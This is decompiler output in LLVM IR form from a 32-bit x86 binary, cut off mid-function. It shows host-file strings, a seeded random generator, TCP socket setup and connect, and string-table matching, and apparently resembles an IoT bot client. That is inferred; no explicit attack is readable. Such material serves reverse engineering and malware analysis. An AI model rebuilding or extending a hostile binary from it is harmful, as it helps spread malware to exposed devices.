@global_var_80628e8.414 = local_unnamed_addr global i32 0
@global_var_805e670.415 = local_unnamed_addr global i32 2
@global_var_805d434.416 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805d431.418 = constant [3 x i8] c"%x\00"
@global_var_805d445.419 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805d450.420 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805e8a0.1 = local_unnamed_addr global i8 0
@global_var_80578ae.11 = external constant [10 x i8*]
@global_var_80628e0.25 = external local_unnamed_addr global i8*
@global_var_805e8d9.41 = local_unnamed_addr global i8 0
@global_var_805e8da.42 = local_unnamed_addr global i8 0
@global_var_805e680.302 = global i16 288
@global_var_805e6d0.303 = local_unnamed_addr global i16 272
@global_var_805c12a.313 = external constant i8*
@global_var_8064be0.342 = global i8 0
@global_var_8064f40.358 = local_unnamed_addr global i8 0
@global_var_8064b00.363 = local_unnamed_addr global i8 0
@global_var_8064b1c.383 = local_unnamed_addr global i8 0
@global_var_805d340.395 = constant x86_fp80* null
@global_var_8064b40.400 = local_unnamed_addr global i64 0
@global_var_805e884.401 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 89975
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8057600()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_805e8a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805e024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805e8a0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %dec_label_pc_80480c0.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805e024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805e8a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 134599780)
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* inttoptr (i32 134602768 to i32*), align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_804816a = ptrtoint i32* %stack_var_4 to i32
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %sext = mul i32 %v4_804816a, 65536
  %v3_8048184 = sdiv i32 %sext, 65536
  %v9_8048184 = inttoptr i32 %v3_8048184 to i32*
  %v10_8048184 = call i32 @function_80540cf(i32 134545873, i32 %arg1, i32* %v9_8048184, i32 134512788, i32 134575668, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  %v0_804818c = load i32, i32* @ebp, align 4
  store i32 %v0_804818c, i32* %stack_var_-36, align 4
  %v4_804818c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v4_804818c, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-64, align 4
  %v1_80481a6 = call i32 @function_805232c(i32 %arg1)
  %v4_80481ae = icmp eq i32 %v1_80481a6, 0
  %v1_80481b2 = icmp eq i1 %v4_80481ae, false
  br i1 %v1_80481b2, label %dec_label_pc_80481c0, label %dec_label_pc_8048285

dec_label_pc_80481c0:                             ; preds = %entry
  %v6_804817d = trunc i32 %v4_804816a to i16
  %v1_80481c3 = add i32 %v1_80481a6, 12
  %v2_80481c3 = inttoptr i32 %v1_80481c3 to i32*
  %v3_80481c3 = load i32, i32* %v2_80481c3, align 4
  %v1_80481cb = add i32 %v1_80481a6, 16
  %v2_80481cb = inttoptr i32 %v1_80481cb to i32*
  %v3_80481cb = load i32, i32* %v2_80481cb, align 4
  %v1_80481ce = inttoptr i32 %v3_80481cb to i32*
  %v2_80481ce = load i32, i32* %v1_80481ce, align 4
  %v15_80481d7 = ptrtoint i32* %stack_var_-56 to i32
  %v3_80481e1 = call i32 @function_80520f8(i32 %v2_80481ce, i32 %v15_80481d7, i32 %v3_80481c3)
  %v2_80481ed = call i32 @function_8052210(i16 %v6_804817d)
  store i32 2, i32* %stack_var_-60, align 4
  %v3_8048216 = call i32 @function_805280c(i32 2, i32 1, i32 6)
  %v2_804821e = ptrtoint i32* %stack_var_-64 to i32
  %v5_8048243 = call i32 @function_80527d0(i32 %v3_8048216, i32 6, i32 1, i32 %v2_804821e, i32 4)
  %v13_8048248 = icmp eq i32 %v3_8048216, -1
  %v1_804824c = icmp eq i1 %v13_8048248, false
  br i1 %v1_804824c, label %dec_label_pc_8048257, label %dec_label_pc_8048285

dec_label_pc_8048257:                             ; preds = %dec_label_pc_80481c0
  %v2_80481d4 = ptrtoint i32* %stack_var_-60 to i32
  %v3_804826c = call i32 @function_8052690(i32 %v3_8048216, i32 %v2_80481d4, i32 16)
  %v10_8048271 = icmp eq i32 %v3_804826c, -1
  %v1_8048274 = icmp eq i1 %v10_8048271, false
  br i1 %v1_8048274, label %dec_label_pc_804827f, label %dec_label_pc_8048285

dec_label_pc_804827f:                             ; preds = %dec_label_pc_8048257
  br label %dec_label_pc_8048285

dec_label_pc_8048285:                             ; preds = %dec_label_pc_8048257, %dec_label_pc_80481c0, %entry, %dec_label_pc_804827f
  %stack_var_-76.0 = phi i32 [ %v3_8048216, %dec_label_pc_804827f ], [ 0, %entry ], [ 0, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_8048257 ]
  ret i32 %stack_var_-76.0

; uselistorder directives
  uselistorder i32 %v3_8048216, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804816a, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder label %dec_label_pc_8048285, { 3, 0, 1, 2 }
}

define i32 @function_804828a(i32 %arg1) local_unnamed_addr {
dec_label_pc_804828a:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805e8e0.5, align 32
  %v1_804829b = add i32 %arg1, -1640531527
  store i32 %v1_804829b, i32* @global_var_805e8e4.6, align 4
  %v1_80482a8 = add i32 %arg1, 1013904242
  store i32 %v1_80482a8, i32* %eax.global-to-local, align 4
  store i32 %v1_80482a8, i32* @global_var_805e8e8.7, align 8
  br label %dec_label_pc_80482bb

dec_label_pc_80482bb:                             ; preds = %dec_label_pc_804828a, %dec_label_pc_80482bb
  %storemerge5 = phi i32 [ 3, %dec_label_pc_804828a ], [ %v4_80482eb, %dec_label_pc_80482bb ]
  %v1_80482c1 = add nsw i32 %storemerge5, -3
  store i32 %v1_80482c1, i32* %eax.global-to-local, align 4
  %v1_80482c4 = mul nuw nsw i32 %v1_80482c1, 4
  %v2_80482c4 = add i32 %v1_80482c4, ptrtoint (i32* @global_var_805e8e0.5 to i32)
  %v3_80482c4 = inttoptr i32 %v2_80482c4 to i32*
  %v4_80482c4 = load i32, i32* %v3_80482c4, align 4
  %v1_80482ce = add nsw i32 %storemerge5, -2
  store i32 %v1_80482ce, i32* %eax.global-to-local, align 4
  %v1_80482d1 = mul nuw nsw i32 %v1_80482ce, 4
  %v2_80482d1 = add i32 %v1_80482d1, ptrtoint (i32* @global_var_805e8e0.5 to i32)
  %v3_80482d1 = inttoptr i32 %v2_80482d1 to i32*
  %v4_80482d1 = load i32, i32* %v3_80482d1, align 4
  %v2_80482d8 = xor i32 %v4_80482d1, %v4_80482c4
  %v2_80482dd = xor i32 %storemerge5, -1640531527
  %v1_80482df = xor i32 %v2_80482dd, %v2_80482d8
  store i32 %v1_80482df, i32* %eax.global-to-local, align 4
  %v2_80482e4 = mul nuw nsw i32 %storemerge5, 4
  %v3_80482e4 = add i32 %v2_80482e4, ptrtoint (i32* @global_var_805e8e0.5 to i32)
  %v4_80482e4 = inttoptr i32 %v3_80482e4 to i32*
  store i32 %v1_80482df, i32* %v4_80482e4, align 4
  %v4_80482eb = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80482eb, 4096
  br i1 %exitcond, label %dec_label_pc_80482f7, label %dec_label_pc_80482bb

dec_label_pc_80482f7:                             ; preds = %dec_label_pc_80482bb
  %v0_80482f8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80482f8

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80482bb, { 1, 0 }
}

define i32 @function_80482f9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80482f9:
  %v0_8048315 = load i32, i32* @global_var_805e614.8, align 4
  %v1_804831a = add i32 %v0_8048315, 1
  %v1_804831b = urem i32 %v1_804831a, 4096
  store i32 %v1_804831b, i32* @global_var_805e614.8, align 4
  %v1_804832a = mul nuw nsw i32 %v1_804831b, 4
  %v2_804832a = add i32 %v1_804832a, ptrtoint (i32* @global_var_805e8e0.5 to i32)
  %v3_804832a = inttoptr i32 %v2_804832a to i32*
  %v4_804832a = load i32, i32* %v3_804832a, align 4
  %v7_8048347 = udiv i32 %v4_804832a, 228675
  store i32 %v7_8048347, i32* @global_var_805e610.9, align 16
  br i1 true, label %dec_label_pc_8048397, label %dec_label_pc_8048389

dec_label_pc_8048389:                             ; preds = %dec_label_pc_80482f9
  br label %dec_label_pc_8048397

dec_label_pc_8048397:                             ; preds = %dec_label_pc_80482f9, %dec_label_pc_8048389
  %v1_80483ac = mul nuw nsw i32 %v1_804831b, 4
  %v2_80483ac = add i32 %v1_80483ac, ptrtoint (i32* @global_var_805e8e0.5 to i32)
  %v3_80483ac = inttoptr i32 %v2_80483ac to i32*
  %v4_80483ac = load i32, i32* %v3_80483ac, align 4
  ret i32 %v4_80483ac

; uselistorder directives
  uselistorder i32 %v1_804831b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048397, { 1, 0 }
}

define i32 @function_80483b9(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80483b9:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80483b9 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b9, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80483d4

dec_label_pc_80483d4:                             ; preds = %dec_label_pc_80483d4, %dec_label_pc_80483b9
  %stack_var_-12.0 = phi i32 [ 0, %dec_label_pc_80483b9 ], [ %v4_80483d4, %dec_label_pc_80483d4 ]
  %v4_80483d4 = add i32 %stack_var_-12.0, 1
  %v2_80483da = mul i32 %v4_80483d4, 4
  %v5_80483dd = add i32 %v2_80483da, %tmp5
  %v1_80483e0 = inttoptr i32 %v5_80483dd to i32*
  %v2_80483e0 = load i32, i32* %v1_80483e0, align 4
  %v1_80483e2 = icmp eq i32 %v2_80483e0, 0
  %v1_80483e4 = icmp eq i1 %v1_80483e2, false
  br i1 %v1_80483e4, label %dec_label_pc_80483d4, label %dec_label_pc_8048419.preheader

dec_label_pc_8048419.preheader:                   ; preds = %dec_label_pc_80483d4
  %v2_8048404 = inttoptr i32 %arg1 to i8*
  %v5_804841f16 = icmp sgt i32 %v4_80483d4, 0
  br i1 %v5_804841f16, label %dec_label_pc_80483ef, label %dec_label_pc_8048428

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_8048419.preheader, %dec_label_pc_8048416
  %storemerge117 = phi i32 [ %v4_8048416, %dec_label_pc_8048416 ], [ 0, %dec_label_pc_8048419.preheader ]
  %v2_80483f2 = mul i32 %storemerge117, 4
  %v5_80483f5 = add i32 %v2_80483f2, %tmp5
  %v1_80483f8 = inttoptr i32 %v5_80483f5 to i32*
  %v2_80483f8 = load i32, i32* %v1_80483f8, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_8048404 = call i32 @function_8052110(i8* %v2_8048404, i32 %v2_80483f8)
  %v1_8048409 = icmp eq i32 %v3_8048404, 0
  br i1 %v1_8048409, label %dec_label_pc_8048416, label %dec_label_pc_8048428

dec_label_pc_8048416:                             ; preds = %dec_label_pc_80483ef
  %v4_8048416 = add nuw nsw i32 %storemerge117, 1
  %v5_804841f = icmp slt i32 %v4_8048416, %v4_80483d4
  br i1 %v5_804841f, label %dec_label_pc_80483ef, label %dec_label_pc_8048428

dec_label_pc_8048428:                             ; preds = %dec_label_pc_80483ef, %dec_label_pc_8048416, %dec_label_pc_8048419.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8048419.preheader ], [ 0, %dec_label_pc_8048416 ], [ 1, %dec_label_pc_80483ef ]
  %v2_804842b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804842b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048416, { 1, 0 }
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_80483d4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
}

define i32 @function_804842d(i32 %arg1) local_unnamed_addr {
dec_label_pc_804842d:
  %stack_var_-4 = alloca i32, align 4
  %v0_804842d = load i32, i32* @ebp, align 4
  store i32 %v0_804842d, i32* %stack_var_-4, align 4
  %v4_804842d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804842d, i32* @ebp, align 4
  %v4_8048441 = call i32 @function_80483b9(i32 %arg1, i32* bitcast ([5 x i8*]* @global_var_805e120.15 to i32*))
  %v2_8048446 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048446, i32* @ebp, align 4
  ret i32 %v4_8048441

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @function_8048448(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048448:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048448 = load i32, i32* @ebp, align 4
  store i32 %v0_8048448, i32* %stack_var_-4, align 4
  %v4_8048448 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048448, i32* @ebp, align 4
  %v4_804845c = call i32 @function_80483b9(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_805e100.23 to i32*))
  %v2_8048461 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048461, i32* @ebp, align 4
  ret i32 %v4_804845c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @function_8048463(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048463:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048463 = load i32, i32* @ebp, align 4
  store i32 %v0_8048463, i32* %stack_var_-4, align 4
  %v4_8048463 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048463, i32* @ebp, align 4
  %v1_804846f = call i32 @function_804842d(i32 %arg1)
  %v1_8048474 = icmp eq i32 %v1_804846f, 0
  %v1_8048476 = icmp eq i1 %v1_8048474, false
  br i1 %v1_8048476, label %dec_label_pc_8048497, label %dec_label_pc_8048478

dec_label_pc_8048478:                             ; preds = %dec_label_pc_8048463
  %v1_804847e = call i32 @function_8048448(i32 %arg1)
  %v1_8048483 = icmp ne i32 %v1_804847e, 0
  %. = zext i1 %v1_8048483 to i32
  br label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %dec_label_pc_8048478, %dec_label_pc_8048463
  %storemerge = phi i32 [ 1, %dec_label_pc_8048463 ], [ %., %dec_label_pc_8048478 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804849c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804849c:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_80484c3 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_80484ca = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_80484d7 = udiv i32 %arg1, 32
  %v1_80484dd = urem i32 %arg1, 32
  %v0_80484e0 = load i32, i32* @ebp, align 4
  %v2_80484e0 = mul nuw nsw i32 %v2_80484d7, 4
  %v3_80484e0 = add nsw i32 %v2_80484e0, -140
  %v4_80484e0 = add i32 %v3_80484e0, %v0_80484e0
  %v5_80484e0 = inttoptr i32 %v4_80484e0 to i32*
  %v6_80484e0 = load i32, i32* %v5_80484e0, align 4
  %v9_80484e0 = shl i32 1, %v1_80484dd
  %v12_80484e0 = or i32 %v6_80484e0, %v9_80484e0
  store i32 %v12_80484e0, i32* %v5_80484e0, align 4
  %v1_80484eb = add i32 %arg1, 1
  %v4_80484f2 = ptrtoint i32* %stack_var_-152 to i32
  %v5_8048513 = call i32 @function_8050e18(i32 %v1_80484eb, i32 %v2_80484c3, i32 0, i32 0, i32 %v4_80484f2)
  %tmp19 = icmp slt i32 %v5_8048513, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048528, label %dec_label_pc_804854f

dec_label_pc_8048528:                             ; preds = %dec_label_pc_804849c
  %v4_8048544 = call i32 @function_8052724(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_804849c, %dec_label_pc_8048528
  %storemerge = phi i32 [ %v4_8048544, %dec_label_pc_8048528 ], [ 0, %dec_label_pc_804849c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804854f, { 1, 0 }
}

define i32 @function_804855e(i32 %arg1) local_unnamed_addr {
dec_label_pc_804855e:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8048561 = load i32, i32* @edi, align 4
  store i32 %v0_8048561, i32* %stack_var_-8, align 4
  %v1_804856b = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_8048570 = and i32 %tmp8, -256
  %v5_8048572 = call i8* @_memset(i8* %v1_804856b, i32 %v1_8048570, i32 %tmp9)
  %v4_804858f = call i32 @function_804849c(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_80485a4 = inttoptr i32 %tmp1 to i32*
  %v3_80485a4 = call i32 @function_80483b9(i32 %tmp8, i32* %v2_80485a4)
  %v1_80485a9 = icmp ne i32 %v3_80485a4, 0
  %storemerge = zext i1 %v1_80485a9 to i32
  %v2_80485c3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80485c3, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @function_80485c6() local_unnamed_addr {
dec_label_pc_80485c6:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_80485c6 = load i32, i32* @ebp, align 4
  %v1_80485cf = add i32 %tmp1, 4
  %v2_80485cf = inttoptr i32 %v1_80485cf to i32*
  %v3_80485cf = load i32, i32* %v2_80485cf, align 4
  %v1_80485db = call i32 @function_80522ef(i32 %v3_80485cf)
  store i32 %v0_80485c6, i32* @ebp, align 4
  ret i32 %v1_80485db
}

define i32 @function_80485e2(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80485e2:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_80485e8 = icmp eq i32 %arg2, 0
  %v6_80485e8 = trunc i32 %arg2 to i8
  %v1_80485ec = icmp eq i1 %v4_80485e8, false
  br i1 %v1_80485ec, label %dec_label_pc_80485fb, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e2
  %v2_80485f1 = load i32, i32* %arg1, align 4
  %v1_80485f6 = call i32 @function_8050b60(i32 %v2_80485f1)
  br label %dec_label_pc_80485fb

dec_label_pc_80485fb:                             ; preds = %dec_label_pc_80485e2, %dec_label_pc_80485ee
  %v1_80485fe = add i32 %tmp3, 16
  %v2_80485fe = inttoptr i32 %v1_80485fe to i32*
  store i32 0, i32* %v2_80485fe, align 4
  %v3_804860d = add i32 %tmp3, 8
  %v4_804860d = inttoptr i32 %v3_804860d to i8*
  store i8 %v6_80485e8, i8* %v4_804860d, align 1
  %v1_8048613 = add i32 %tmp3, 24
  %v2_8048613 = inttoptr i32 %v1_8048613 to i32*
  %v3_8048613 = load i32, i32* %v2_8048613, align 4
  %v3_804862c = inttoptr i32 %v3_8048613 to i8*
  %v4_804862c = call i32 @function_8051e84(i8* %v3_804862c, i32 0, i32 1024)
  ret i32 %v4_804862c

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80485fb, { 1, 0 }
}

define i32 @function_8048633(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048633:
  %v2_8048647 = inttoptr i32 %arg1 to i32*
  %v3_8048647 = call i32 @function_80485e2(i32* %v2_8048647, i32 0)
  %v1_804864f = add i32 %arg1, 9
  %v2_804864f = inttoptr i32 %v1_804864f to i8*
  store i8 1, i8* %v2_804864f, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_8048655(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048655:
  %v4_8048663 = ptrtoint i8* %arg1 to i32
  %v3_8048674 = call i32 @_strlen(i8* %arg1)
  %v1_804867b = add i32 %v3_8048674, -1
  br label %dec_label_pc_8048684

dec_label_pc_8048681:                             ; preds = %dec_label_pc_8048684
  %v4_8048681 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048684

dec_label_pc_8048684:                             ; preds = %dec_label_pc_8048655, %dec_label_pc_8048681
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_8048655 ], [ %v4_8048681, %dec_label_pc_8048681 ]
  %v6_8048687 = add i32 %stack_var_-16.0, %v4_8048663
  %v1_804868a = inttoptr i32 %v6_8048687 to i8*
  %v2_804868a = load i8, i8* %v1_804868a, align 1
  %v2_804868d = sext i8 %v2_804868a to i32
  %v1_8048693 = call i32 @function_8050f5c(i32 %v2_804868d)
  %v1_8048698 = icmp eq i32 %v1_8048693, 0
  %v1_804869a = icmp eq i1 %v1_8048698, false
  br i1 %v1_804869a, label %dec_label_pc_8048681, label %dec_label_pc_80486a1.preheader

dec_label_pc_80486a1.preheader:                   ; preds = %dec_label_pc_8048684
  %v5_80486a720 = icmp slt i32 %v1_804867b, %stack_var_-16.0
  br i1 %v5_80486a720, label %dec_label_pc_80486c1, label %dec_label_pc_80486a9

dec_label_pc_804869e:                             ; preds = %dec_label_pc_80486a9
  %v4_804869e = add i32 %stack_var_-12.021, -1
  %v5_80486a7 = icmp slt i32 %v4_804869e, %stack_var_-16.0
  br i1 %v5_80486a7, label %dec_label_pc_80486c1, label %dec_label_pc_80486a9

dec_label_pc_80486a9:                             ; preds = %dec_label_pc_80486a1.preheader, %dec_label_pc_804869e
  %stack_var_-12.021 = phi i32 [ %v4_804869e, %dec_label_pc_804869e ], [ %v1_804867b, %dec_label_pc_80486a1.preheader ]
  %v6_80486ac = add i32 %stack_var_-12.021, %v4_8048663
  %v1_80486af = inttoptr i32 %v6_80486ac to i8*
  %v2_80486af = load i8, i8* %v1_80486af, align 1
  %v2_80486b2 = sext i8 %v2_80486af to i32
  %v1_80486b8 = call i32 @function_8050f5c(i32 %v2_80486b2)
  %v1_80486bd = icmp eq i32 %v1_80486b8, 0
  %v1_80486bf = icmp eq i1 %v1_80486bd, false
  br i1 %v1_80486bf, label %dec_label_pc_804869e, label %dec_label_pc_80486c1

dec_label_pc_80486c1:                             ; preds = %dec_label_pc_804869e, %dec_label_pc_80486a9, %dec_label_pc_80486a1.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_804867b, %dec_label_pc_80486a1.preheader ], [ %stack_var_-12.021, %dec_label_pc_80486a9 ], [ %v4_804869e, %dec_label_pc_804869e ]
  %v7_80486ea10 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.lcssa
  br i1 %v7_80486ea10, label %dec_label_pc_80486ec, label %dec_label_pc_80486c9

dec_label_pc_80486c9:                             ; preds = %dec_label_pc_80486c1, %dec_label_pc_80486c9
  %v6_80486f412 = phi i32 [ %v6_80486f4, %dec_label_pc_80486c9 ], [ %v4_8048663, %dec_label_pc_80486c1 ]
  %storemerge11 = phi i32 [ %v4_80486e1, %dec_label_pc_80486c9 ], [ %stack_var_-16.0, %dec_label_pc_80486c1 ]
  %v6_80486d9 = add i32 %storemerge11, %v4_8048663
  %v1_80486dc = inttoptr i32 %v6_80486d9 to i8*
  %v2_80486dc = load i8, i8* %v1_80486dc, align 1
  %v3_80486df = inttoptr i32 %v6_80486f412 to i8*
  store i8 %v2_80486dc, i8* %v3_80486df, align 1
